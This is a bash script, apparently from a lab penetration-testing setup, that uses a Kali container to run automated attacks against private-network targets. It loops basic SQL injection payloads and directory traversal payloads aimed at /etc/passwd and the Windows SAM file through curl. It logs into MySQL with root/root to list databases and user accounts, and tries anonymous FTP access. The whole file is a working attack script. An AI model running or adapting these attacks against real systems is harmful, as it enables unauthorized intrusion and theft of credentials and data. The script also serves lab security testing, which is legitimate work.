#!/bin/bash
# Exploitation script - automated exploitation attempts
# WARNING: This script performs actual exploitation attempts

KALI_CONTAINER="pentest-kali"
OUTPUT_DIR="/root/pentest-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "Starting exploitation attempts..."
echo "Timestamp: $TIMESTAMP"
echo "WARNING: This script performs actual exploitation attempts"

docker exec $KALI_CONTAINER mkdir -p $OUTPUT_DIR

# SQL injection test on web server
echo "Testing SQL injection on web server..."
WEB_TARGET="172.21.0.2:80"
OUTPUT_FILE="${OUTPUT_DIR}/sqli_test_${TIMESTAMP}.txt"

# Basic SQL injection payloads
PAYLOADS=("' OR '1'='1" "' UNION SELECT NULL--" "admin'--" "1' OR '1'='1")

for payload in "${PAYLOADS[@]}"; do
    echo "Testing payload: $payload"
    docker exec $KALI_CONTAINER sh -c "curl -s 'http://$WEB_TARGET/?id=$payload' 2>&1 >> \"$OUTPUT_FILE\"" || true
done

# Directory traversal test
echo "Testing directory traversal..."
PAYLOADS=("../etc/passwd" "..\\..\\windows\\system32\\config\\sam" "../../../etc/passwd")

for payload in "${PAYLOADS[@]}"; do
    echo "Testing payload: $payload"
    docker exec $KALI_CONTAINER sh -c "curl -s 'http://$WEB_TARGET/?file=$payload' 2>&1 >> \"$OUTPUT_FILE\"" || true
done

# MySQL exploitation
echo "Attempting MySQL exploitation..."
MYSQL_TARGET="172.22.0.3"
OUTPUT_FILE="${OUTPUT_DIR}/mysql_exploit_${TIMESTAMP}.txt"

# Try to connect and enumerate
docker exec $KALI_CONTAINER sh -c "mysql -h $MYSQL_TARGET -u root -proot -e 'SHOW DATABASES; SELECT user, host FROM mysql.user;' 2>&1 >> \"$OUTPUT_FILE\"" || true

# FTP exploitation
echo "Attempting FTP exploitation..."
FTP_TARGET="172.22.0.4"
OUTPUT_FILE="${OUTPUT_DIR}/ftp_exploit_${TIMESTAMP}.txt"

# Try anonymous access and file listing
docker exec $KALI_CONTAINER sh -c "ftp -n $FTP_TARGET <<EOF
user anonymous anonymous
ls -la
quit
EOF
2>&1 >> \"$OUTPUT_FILE\"" || true

echo ""
echo "Exploitation attempts complete!"
echo "Results saved in Kali container at: $OUTPUT_DIR"
